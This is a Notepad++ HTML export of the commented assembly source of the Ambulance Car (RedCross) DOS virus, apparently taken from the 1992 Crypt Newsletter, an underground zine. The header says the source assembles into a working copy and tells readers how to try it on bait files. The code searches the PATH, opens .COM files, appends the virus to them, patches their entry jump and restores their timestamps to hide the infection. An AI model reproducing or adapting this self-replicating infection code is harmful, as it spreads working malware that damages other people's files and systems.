<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;REDCROSS/AMBULANCE CAR VIRUS for Crypt Newsletter #10, edited by Urnst Kouch</span><span class="sc0">
</span><span class="sc1">;December 1992</span><span class="sc0">
</span><span class="sc1">;Originally supplied as a Sourcer disassembly in a Scandinavian virus mag</span><span class="sc0">
</span><span class="sc1">;published by "Youth Against McAfee (YAM)", this AMBULANCE specimen was </span><span class="sc0">
</span><span class="sc1">;generated in its raw form by "Natas Kaupas." Hold that up to your mirror</span><span class="sc0">
</span><span class="sc1">;and it spells Satan. Whatever, "Natas/Satan" has also supplied us with the</span><span class="sc0">
</span><span class="sc1">;MINDLESS/FamR series of viruses for you trivia buffs. The Crypt Newsletter</span><span class="sc0">
</span><span class="sc1">;is obliged to him, wherever he is, for these interesting programs.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;In any case, while helpful, the original disassembly had diminished</span><span class="sc0">
</span><span class="sc1">;value, being completely uncommented. It did, however, assemble </span><span class="sc0">
</span><span class="sc1">;under TASM into an actual working copy of the virus, which</span><span class="sc0">
</span><span class="sc1">;appears to be the AMBULANCE CAR B strain.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Ambulance Car remains an interesting virus, packed with enough features</span><span class="sc0">
</span><span class="sc1">;so that it can still find its target files, .COM executables, wherever</span><span class="sc0">
</span><span class="sc1">;they might be lurking on a system.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Principally, this revolves around the virus searching the path string set</span><span class="sc0">
</span><span class="sc1">;in the environment. If no path exists, the virus defaults to the</span><span class="sc0">
</span><span class="sc1">;current directory. In both cases, the virus may infect up to two files</span><span class="sc0">
</span><span class="sc1">;anywhere on the path per pass. Most times it will infect only one. </span><span class="sc0">
</span><span class="sc1">;Sometimes it will not budge at all. </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Once it's found a file, Ambulance checks it for the 0E9h byte at </span><span class="sc0">
</span><span class="sc1">;the beginning. If it doesn't find it, the virus assumes the file is</span><span class="sc0">
</span><span class="sc1">;uninfected and immediately tries to complete the infection. If</span><span class="sc0">
</span><span class="sc1">;it does find the byte, it continues reading from there to confirm</span><span class="sc0">
</span><span class="sc1">;the viral sequence. If this is a coincidence and the complete sequence</span><span class="sc0">
</span><span class="sc1">;is not there, the virus will infect the file anyway.  </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Randomly, the virus will activate and run the Ambulance across the bottom</span><span class="sc0">
</span><span class="sc1">;of your screen after a round of infection.  Because of the path search</span><span class="sc0">
</span><span class="sc1">;Ambulance can easily find .COM executables on a sizeable disk at a time</span><span class="sc0">
</span><span class="sc1">;when there are less and less of these to be seen. Unfortunately, for a</span><span class="sc0">
</span><span class="sc1">;direct-action virus, the disk activity is noticeable with the caveats:</span><span class="sc0">
</span><span class="sc1">;on a fast machine, perhaps not; or in front of an average user, perhaps not.</span><span class="sc0">
</span><span class="sc1">;You never know how a user will react when dealing with viruses.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;You can easily experiment with this version on your machine by commenting</span><span class="sc0">
</span><span class="sc1">;out the path statement in your AUTOEXEC.BAT. This will restrict the</span><span class="sc0">
</span><span class="sc1">;virus to a test directory where it can be used to infect bait files</span><span class="sc0">
</span><span class="sc1">;until the Ambulance effect is seen.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Ambulance Car is detected by "rules-based" anti-virus sentries like</span><span class="sc0">
</span><span class="sc1">;PCRx (reviewed in this issue), but keep in mind this type of</span><span class="sc0">
</span><span class="sc1">;protection is not flawless. Accidents can happen. Most current scanners </span><span class="sc0">
</span><span class="sc1">;easily detect this variant of Ambulance, although</span><span class="sc0">
</span><span class="sc1">;some cannot disinfect files once they are parasitized.</span><span class="sc0">

</span><span class="sc5">data_1e</span><span class="sc0">           </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0Ch</span><span class="sc0">
</span><span class="sc5">data_2e</span><span class="sc0">           </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">49h</span><span class="sc0">
</span><span class="sc5">data_3e</span><span class="sc0">           </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">6Ch</span><span class="sc0">
</span><span class="sc5">psp_envirn_seg</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">2Ch</span><span class="sc0">
</span><span class="sc5">data_21e</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0C80h</span><span class="sc0">

</span><span class="sc5">virus</span><span class="sc0">             </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">public</span><span class="sc0">
          </span><span class="sc9">assume</span><span class="sc0">  </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">virus</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">virus</span><span class="sc0">


          </span><span class="sc9">org</span><span class="sc0">     </span><span class="sc2">100h</span><span class="sc0">

</span><span class="sc5">redcross</span><span class="sc0">          </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">far</span><span class="sc0">   </span><span class="sc1">;main flow control procedure for Ambulance</span><span class="sc0">
                                </span><span class="sc1">;Car virus</span><span class="sc0">
</span><span class="sc5">start</span><span class="sc4">:</span><span class="sc0">
          </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">virstart</span><span class="sc0">
</span><span class="sc5">data_5</span><span class="sc0">            </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">4890h</span><span class="sc0">          </span><span class="sc1">; Data table </span><span class="sc0">
</span><span class="sc5">data_7</span><span class="sc0">            </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">6C65h</span><span class="sc0">          </span><span class="sc1">; Data table </span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">6Ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">

</span><span class="sc5">copyright</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Copyright S &amp; S Enterprises, 198'</span><span class="sc1">;whoah, how'd Solomon's</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'8'</span><span class="sc0">                                 </span><span class="sc1">;stamp get in here? ;-]</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">0Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">24h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1Ah</span><span class="sc4">,</span><span class="sc2">0B4h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">09h</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0BAh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">0CDh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc4">,</span><span class="sc2">0CDh</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">20h</span><span class="sc0">
</span><span class="sc5">virstart</span><span class="sc4">:</span><span class="sc0">                     
          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0E8h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">7Fh</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
          </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                   </span><span class="sc1">; port 0, channel 0</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">check_infect</span><span class="sc0">            </span><span class="sc1">; do path search, infect file</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">check_infect</span><span class="sc0">            </span><span class="sc1">; ditto, sometimes, sometimes not</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">sound_fury</span><span class="sc0">              </span><span class="sc1">; do we do AMBULANCE effect? Check!</span><span class="sc0">
          </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">419h</span><span class="sc4">]</span><span class="sc0">            
          </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
          </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">                      </span><span class="sc1">; Register jump</span><span class="sc0">

</span><span class="sc5">exit</span><span class="sc4">:</span><span class="sc0">
          </span><span class="sc6">retn</span><span class="sc0">                            </span><span class="sc1">; handoff to host</span><span class="sc0">

</span><span class="sc5">redcross</span><span class="sc0">              </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;*****************************************************************************</span><span class="sc0">
</span><span class="sc1">;         SUBROUTINE</span><span class="sc0">
</span><span class="sc1">;*****************************************************************************</span><span class="sc0">

</span><span class="sc5">check_infect</span><span class="sc0">         </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">         </span><span class="sc1">; path search for Ambulance</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">loadpath</span><span class="sc0">                </span><span class="sc1">; Car</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">data_19</span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                    
          </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">exit</span><span class="sc0">                    </span><span class="sc1">; No path/no files? Git!</span><span class="sc0">
          </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">40Fh</span><span class="sc4">]</span><span class="sc0">            
          </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">428h</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; load effective address</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3D02h</span><span class="sc0">
          </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                </span><span class="sc1">; open found file by loadpath read/write</span><span class="sc0">
                                          </span><span class="sc1">; with handle</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">417h</span><span class="sc4">][</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">  </span><span class="sc1">;ax contains handle</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">417h</span><span class="sc4">][</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
          </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">414h</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; load address of buffer</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc0">                  </span><span class="sc1">; to read first three bytes into.</span><span class="sc0">
          </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                     </span><span class="sc1">; Read the bytes . . .</span><span class="sc0">
                                          </span><span class="sc1">; bx points to file handle.</span><span class="sc0">
                                          </span><span class="sc1">;   </span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">414h</span><span class="sc4">][</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0E9h</span><span class="sc0">                 </span><span class="sc1">; compare with 0E9h</span><span class="sc0">
          </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">infect</span><span class="sc0">        </span><span class="sc1">; if not equal, assume virus not here - infect</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">415h</span><span class="sc4">][</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">  
          </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">417h</span><span class="sc4">][</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
          </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                   </span><span class="sc1">; zero register</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">
          </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                     </span><span class="sc1">; point to beginning of file, again</span><span class="sc0">
                                          </span><span class="sc1">; bx contains the handle</span><span class="sc0">
                                          
          </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">417h</span><span class="sc4">][</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">
          </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">41Ch</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; load effective address</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc0">                  </span><span class="sc1">; and read the first 6 bytes</span><span class="sc0">
          </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                     </span><span class="sc1">; this time  </span><span class="sc0">
                                            
                                          </span><span class="sc1">; ds:dx points to buffer</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">data_13</span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc5">data_14</span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">data_15</span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">100h</span><span class="sc4">][</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; compare with data copied above</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">infect</span><span class="sc0">                    </span><span class="sc1">; jump if not equal to infect</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc5">data_5</span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">infect</span><span class="sc0">                    </span><span class="sc1">; jump if not equal</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">data_7</span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">close</span><span class="sc0">                   </span><span class="sc1">; finally, if we get a match we know</span><span class="sc0">
</span><span class="sc5">infect</span><span class="sc4">:</span><span class="sc0">                                    </span><span class="sc1">; we're here, so go to close up </span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">417h</span><span class="sc4">][</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                   </span><span class="sc1">; zero register</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                   </span><span class="sc1">; zero register</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4202h</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                     </span><span class="sc1">; reset pointer to end of file</span><span class="sc0">
                                         </span><span class="sc1">; bx contains file handle</span><span class="sc0">
                                          
         </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">412h</span><span class="sc4">][</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">417h</span><span class="sc4">][</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5700h</span><span class="sc0">                </span><span class="sc1">; bx points to name of file</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                     </span><span class="sc1">; get file date and time</span><span class="sc0">
                                         </span><span class="sc1">; time returns in cx, date in dx</span><span class="sc0">
                                          
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">                      </span><span class="sc1">; push these onto the stack</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">                      </span><span class="sc1">; we'll need 'em later</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">417h</span><span class="sc4">][</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">319h</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">100h</span><span class="sc4">]</span><span class="sc0">            
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                  </span><span class="sc1">; write the virus to the end of</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                     </span><span class="sc1">; the file, identified in bx</span><span class="sc0">
                                         </span><span class="sc1">; cx contains virus length for write</span><span class="sc0">
                                         </span><span class="sc1">; so do it, yes, append virus</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">417h</span><span class="sc4">][</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">414h</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; load effective address</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                  </span><span class="sc1">; </span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                     </span><span class="sc1">; DOS Services  ah=function 40h</span><span class="sc0">
                                         </span><span class="sc1">; write file  bx=file handle</span><span class="sc0">
                                         </span><span class="sc1">; cx=bytes from ds:dx buffer</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">417h</span><span class="sc4">][</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                   </span><span class="sc1">; zero register</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                   </span><span class="sc1">; zero register</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                     </span><span class="sc1">; reset the pointer to start of file</span><span class="sc0">
                                         </span><span class="sc1">; identified in bx</span><span class="sc0">
                                         </span><span class="sc1">; cx,dx=offset</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">417h</span><span class="sc4">][</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">411h</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; load effective address</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                  </span><span class="sc1">; and write the first three virus id</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                     </span><span class="sc1">; and jump bytes to the file</span><span class="sc0">
                                         </span><span class="sc1">; now, just about finished</span><span class="sc0">
                                         
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">                      </span><span class="sc1">; retrieve date</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">                      </span><span class="sc1">; and time from stack</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">417h</span><span class="sc4">][</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5701h</span><span class="sc0">                </span><span class="sc1">; restore file's date/time</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                     

</span><span class="sc5">close</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">417h</span><span class="sc4">][</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Eh</span><span class="sc0">                  
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                     </span><span class="sc1">; close file</span><span class="sc0">
                                         
         </span><span class="sc6">retn</span><span class="sc0">                            </span><span class="sc1">; return to caller, maybe we'll </span><span class="sc0">
</span><span class="sc5">check_infect</span><span class="sc0">      </span><span class="sc9">endp</span><span class="sc0">                   </span><span class="sc1">; infect again, maybe not</span><span class="sc0">


